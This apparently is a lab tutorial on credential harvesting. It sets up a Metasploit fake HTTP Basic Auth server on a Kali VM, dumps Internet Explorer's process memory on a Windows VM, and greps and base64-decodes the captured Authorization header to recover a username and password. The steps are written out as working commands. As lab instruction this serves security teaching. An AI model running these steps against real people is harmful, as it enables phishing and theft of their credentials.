
---

## 🛠️ **Password Mining via Memory Dump (HTTP Basic Auth)**

---

### 🐱‍💻 **Kali VM — Setup Fake Server**

---

#### **1. Launch Metasploit**

```bash
msfconsole
```

- Starts the Metasploit Framework — a powerful penetration testing tool.
    

---

#### **2. Use HTTP Basic Authentication Capture Module**

```bash
use auxiliary/server/capture/http_basic
```

- This module **creates a fake web server** that prompts visitors for **Basic Authentication credentials**.
    

---

#### **3. Set the URI path for the server**

```bash
set uripath x
```

- Sets the fake login page path.
    
- Victim will browse to: `http://[Kali_IP]/x`
    

---

#### **4. Start the fake server**

```bash
run
```

- The server is now live and will log any credentials submitted via basic auth.
    

---

### 🪟 **Windows VM — Trigger the Credential Submission**

---

#### **1. Browse to the malicious site**

- Open Internet Explorer.
    
- Go to:
    
    ```
    http://[Kali VM IP]/x
    ```
    
- IE may prompt for credentials using a native Basic Auth dialog.
    

> ⚠️ _Even if no credentials are typed_, the browser's memory may store artifacts of the attempted connection, which we’ll later mine.

---

#### **2. Dump IE’s process memory**

- Open Task Manager (`taskmgr`).
    
- Find `iexplore.exe` in the **Processes** or **Details** tab.
    
- Right-click → **Create Dump File**.
    

> This saves a snapshot of the browser's memory, potentially including authentication headers.

---

#### **3. Transfer the dump to Kali**

- Copy the `.DMP` file (e.g., `iexplore.DMP`) to the Kali VM — typically via shared folder or SCP.
    

---

### 🐱‍💻 **Kali VM — Extract Credentials from Memory**

---

#### **1. Locate the dump file**

```bash
# Assuming it’s on the desktop
strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
```

- **`strings`** extracts readable ASCII strings from binary files.
    
- **`grep`** filters for lines with Basic Auth headers.
    
- You’ll see something like:
    
    ```
    Authorization: Basic dXNlcjpwYXNzd29yZA==
    ```
    

---

#### **2. Decode the Base64 string**

```bash
echo -ne dXNlcjpwYXNzd29yZA== | base64 -d
```

- Outputs:
    
    ```
    user:password
    ```
    

> 🧠 You've now recovered credentials from memory — a form of post-exploitation credential harvesting.

---